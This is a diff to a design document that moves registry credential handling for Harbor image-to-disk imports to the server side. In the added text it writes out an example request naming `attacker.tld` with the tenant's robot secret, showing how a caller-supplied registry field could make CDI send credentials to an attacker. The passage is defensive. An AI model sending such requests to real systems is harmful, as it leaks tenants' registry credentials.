@@ -207,14 +207,36 @@ rows with a `catalog_available: false` marker.
 ### Materialising an image
 
 "Create disk from image" posts to the existing create endpoint with
-`source_registry`, plus two fields that path does not currently support:
+`catalog_ref` — the host-less `"<project>/<repository>:<tag>"` string
+`GET /images` reported — and the target namespace. Nothing else.
 
-- `secretRef` — the tenant's robot credential. CDI resolves it in the
+The backend adds the rest, because all of it is a server-side fact:
+
+- the registry host and the `docker://` scheme, from `harbor_registry_host()`
+- `secretRef` — the tenant's robot credential, named by convention
+  (`HARBOR_ROBOT_SECRET`, default `harbor-robot`). CDI resolves it in the
   DataVolume's own namespace, so the Secret must exist in the target namespace,
   which is the same namespace the `harbor-robots` chart provisions it into.
-- `certConfigMap` — needed while Harbor uses a private CA; harmless once it does not
+- `certConfigMap` — needed while Harbor uses a private CA; attached only when a
+  ConfigMap by that name actually exists, since CDI refuses an import outright
+  when it names nothing.
 
-Both are additions to the existing DataVolume construction, not a new path.
+**The credential is derived from the RESOLVED registry host, and the request
+carries no credential field at all.** An earlier draft of this section had the
+caller send `secretRef`/`certConfigMap` alongside `source_registry`, and it was
+implemented that way. That is a credential-exfiltration primitive: a request
+naming `source_registry: docker://attacker.tld/x:1` and
+`source_registry_secret: harbor-robot` makes CDI authenticate to the
+attacker's registry with the tenant's robot password. Validating the URL and
+keeping the field is not the fix — an allow-list over a caller-supplied string
+that gates a credential is one bypass away from the same bug. `source_registry`
+survives for ordinary registry imports and gets a credential only when its host
+is Harbor's own; anything else is an anonymous pull, which is what it was
+before this feature existed.
+
+Materialising is gated by `HARBOR_IMAGE_ENABLED` like every other Harbor path.
+It was not, originally — the flag reached the list handler and publish and not
+this one — so "with the flag unset the behaviour is unchanged" was false.
 
 ## Publish
 
